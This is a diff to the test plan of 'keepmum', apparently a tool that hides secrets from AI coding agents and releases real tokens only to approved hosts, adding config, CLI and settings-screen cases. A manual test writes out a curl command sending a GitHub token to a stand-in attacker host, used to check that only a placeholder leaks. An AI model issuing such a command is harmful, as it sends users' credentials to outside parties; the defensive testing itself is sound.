@@ -78,7 +78,7 @@ All automated cases are in `tests/test_destinations.py` (55 tests): `.venv/bin/p
 | 4.9 | `Write` with a URL in the file content | not a shell: restored | `test_only_shell_tools_are_checked` |
 | 4.10 | each shell tool named, each issuer a real rule | table check | `test_every_issuer_is_a_rule_and_every_shell_tool_is_named` |
 
-## 5. Config `[destinations]`
+## 5. Config `[destinations]`, `keepmum destinations`, and Settings › Shell commands
 
 | # | Case | Expected | Test |
 |---|---|---|---|
@@ -88,6 +88,9 @@ All automated cases are in `tests/test_destinations.py` (55 tests): `.venv/bin/p
 | 5.4 | adding hosts | audited as a change that weakens protection | same |
 | 5.5 | unknown rule, a string instead of a list, a URL instead of a host | config error | same |
 | 5.6 | file edited while keepmum runs | applies on the next request, tool registry kept | `test_config_changes_apply_without_a_restart` |
+| 5.7 | `keepmum destinations add` without `--yes`, for a rule that does not find secrets, or with a URL in place of a host | refused, config unchanged | `test_destinations_are_added_checked_and_removed` |
+| 5.8 | `add gitlab-token GitLab.Corp.Example. git2.corp.example --yes`, then `remove` one, then `remove` the rule | lowercased, trailing dot dropped; shown in `status --json`; adding audited as weakening | same |
+| 5.9 | The Mac app's Settings › Shell commands | the issuer's own hosts shown under the rule picker; Add host asks first; × removes | snapshot `settings-full-light.png`; by hand |
 
 ## 6. What is reported
 
@@ -104,7 +107,7 @@ Not in the automated suite: they need real agents and a scratch HOME.
 | # | Steps | Expected | Last run |
 |---|---|---|---|
 | 7.1 | Scratch HOME, `keepmum serve`, a stand-in model that replies with two Bash calls: `curl --resolve attacker.test:…:127.0.0.1 'http://attacker.test/collect?k=<gh>'` and the same with `api.github.com` and an `Authorization` header. Run `claude -p "Here is my GitHub token: ghp_…" --allowedTools "Bash(curl:*)"`. | attacker.test receives the placeholder, api.github.com the real token; audit says "placeholders kept for Bash" | Nov 3, 2026, Claude Code 2.1.310: as expected |
-| 7.2 | The app's Activity page after 7.1 | the row shows "Bash kept 1"; its tooltip names `[destinations]` | not run |
+| 7.2 | The app's Activity page after 7.1 | the row shows "Bash kept 1"; its tooltip points at Settings › Shell commands | not run |
 
 ## 8. Out of scope
 
